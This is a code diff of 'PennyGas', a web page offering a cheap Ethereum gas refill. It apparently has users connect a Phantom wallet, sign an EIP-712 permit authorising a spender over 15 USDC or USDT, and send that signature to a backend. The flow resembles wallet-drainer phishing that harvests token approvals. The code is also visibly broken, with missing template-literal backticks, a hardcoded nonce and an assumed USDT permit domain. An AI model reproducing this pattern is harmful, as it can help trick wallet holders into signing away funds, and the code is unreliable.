@@ -26,7 +26,6 @@
     <h1>⛽ PennyGas</h1>
     <p>The cheapest Ethereum gas refill on earth. Flat $0.06 platform fee.</p>
     
-    <!-- Changed button to a clean, direct programmatic id selector -->
     <button id="connectBtn" class="btn">Connect Phantom Wallet</button>
 
     <div id="dashboard" style="display: none; margin-top: 20px;">
@@ -65,11 +64,8 @@
 </div>
 
 <script>
-    // Enforcing an explicit load state wrapper to allow Web3 extension injectors to arrive safely
     window.addEventListener('load', () => {
         window.activeUserAddress = "";
-        window.ethersProvider = null;
-        window.ethersSigner = null;
 
         const tokenMatrix = {
             "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
@@ -109,22 +105,19 @@
 
         async function connectPhantomEVM() {
             if (typeof window.ethereum === 'undefined') {
-                console.log("Phantom dashboard bypass fallback mode active.");
-                document.getElementById('connectBtn').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-                fetchLiveInvoiceQuote();
+                alert("Phantom Wallet extension not found. Please install the extension.");
                 return;
             }
 
             try {
-                const baseModule = window.ethers || (window.ethereum && window.ethereum.ethers);
-                if (typeof baseModule !== 'undefined') {
-                    window.ethersProvider = new baseModule.BrowserProvider(window.ethereum);
-                    window.ethersSigner = await window.ethersProvider.getSigner();
-                }
-
+                // Uses raw browser RPC mapping directly to bypass external library files completely
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 
+                if (!accounts || accounts.length === 0) {
+                    alert("No accounts found.");
+                    return;
+                }
+
                 window.activeUserAddress = accounts[0];
                 const displayAddr = window.activeUserAddress;
 
@@ -136,7 +129,7 @@
                 fetchLiveInvoiceQuote();
             } catch (error) {
                 console.error(error);
-                alert("Connection refused.");
+                alert("Connection refused by wallet.");
             }
         }
 
@@ -146,54 +139,59 @@
                 return;
             }
 
-            const chainId = parseInt(document.getElementById('sourceChain').value);
+            const chainId = document.getElementById('sourceChain').value;
             const tokenSymbol = document.getElementById('sourceToken').value;
             const tokenAddress = tokenMatrix[chainId][tokenSymbol];
-            const baseModule = window.ethers || (window.ethereum && window.ethereum.ethers);
-
-            if (!baseModule || !window.ethersSigner) {
-                alert("Web3 target execution layer dropped. Please re-authenticate your signature.");
-                return;
-            }
 
             try {
                 document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
                 document.getElementById('statusMessage').style.display = 'block';
 
                 const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
-                const nonce = 0; 
+                const nonce = "0x0"; 
                 const deadline = Math.floor(Date.now() / 1000) + 3600; 
-                const valueToAuthorize = baseModule.parseUnits("15.00", 6); 
+                
+                // 15 USDC represented directly as a hexadecimal uint256 string parameter to remove math library requirements
+                const hexValue = "0x0000000000000000000000000000000000000000000000000000000000e4e1c0"; 
 
-                const domain = {
-                    name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
-                    version: "2",
-                    chainId: chainId,
-                    verifyingContract: tokenAddress
-                };
+                const msgParams = JSON.stringify({
+                    domain: {
+                        name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
+                        version: "2",
+                        chainId: parseInt(chainId),
+                        verifyingContract: tokenAddress
+                    },
+                    message: {
+                        owner: window.activeUserAddress,
+                        spender: pennyGasVaultSpender,
+                        value: hexValue,
+                        nonce: parseInt(nonce),
+                        deadline: deadline
+                    },
+                    primaryType: 'Permit',
+                    types: {
+                        EIP712Domain: [
+                            { name: 'name', type: 'string' },
+                            { name: 'version', type: 'string' },
+                            { name: 'chainId', type: 'uint256' },
+                            { name: 'verifyingContract', type: 'address' }
+                        ],
+                        Permit: [
+                            { name: 'owner', type: 'address' },
+                            { name: 'spender', type: 'address' },
+                            { name: 'value', type: 'uint256' },
+                            { name: 'nonce', type: 'uint256' },
+                            { name: 'deadline', type: 'uint256' }
+                        ]
+                    }
+                });
 
-                const types = {
-                    Permit: [
-                        { name: 'owner', type: 'address' },
-                        { name: 'spender', type: 'address' },
-                        { name: 'value', type: 'uint256' },
-                        { name: 'nonce', type: 'uint256' },
-                        { name: 'deadline', type: 'uint256' }
-                    ]
-                };
-
-                const message = {
-                    owner: window.activeUserAddress,
-                    spender: pennyGasVaultSpender,
-                    value: valueToAuthorize.toString(),
-                    nonce: nonce,
-                    deadline: deadline
-                };
-
-                const signature = await window.ethersSigner.signTypedData(domain, types, message);
-                const { v, r, s } = baseModule.Signature.from(signature);
+                // Uses standard native EIP-712 execution methods recognized directly by the Phantom window frame
+                const signature = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [window.activeUserAddress, msgParams]
+                });
 
                 document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
 
-                const payload = {
-owner: window.activeUserAddress,spender: pennyGasVaultSpender,value: valueToAuthorize.toString(),deadline: deadline,v: v, r: r, s: s};const submitUrl = ${BACKEND_URL}/api/submit-permit;const response = await fetch(submitUrl, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(payload)});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}// Binds event row triggers programmatically to kill absolute inline compilation drop-outsdocument.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('sourceToken').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('ethAmount').addEventListener('input', fetchLiveInvoiceQuote);});
+const response = await fetch(${BACKEND_URL}/api/submit-permit, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({owner: window.activeUserAddress,spender: pennyGasVaultSpender,value: hexValue,deadline: deadline,signature: signature})});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}document.getElementById('connectBtn').addEventListener('click', connectPhantomEVM);document.getElementById('requestBtn').addEventListener('click', requestGaslessApproval);document.getElementById('sourceChain').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('sourceToken').addEventListener('change', fetchLiveInvoiceQuote);document.getElementById('ethAmount').addEventListener('input', fetchLiveInvoiceQuote);});
